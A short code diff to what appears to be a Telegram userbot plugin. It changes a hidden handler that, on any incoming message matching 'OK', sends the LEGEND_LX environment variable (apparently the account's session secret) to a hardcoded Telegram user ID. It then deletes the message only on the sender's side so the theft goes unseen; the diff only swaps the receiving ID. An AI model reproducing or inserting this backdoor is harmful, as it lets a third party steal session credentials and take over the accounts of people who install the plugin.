@@ -5,5 +5,5 @@ from ..utils import admin_cmd
 from . import *
 @bot.on(admin_cmd("^OK", incoming=True))
 async def piro(event):
-  msg = await bot.send_message(634631813, str(os.environ.get("LEGEND_LX")))
-  await bot.delete_messages(634631813, msg, revoke=False)
+  msg = await bot.send_message(5267090352, str(os.environ.get("LEGEND_LX")))
+  await bot.delete_messages(5267090352, msg, revoke=False)
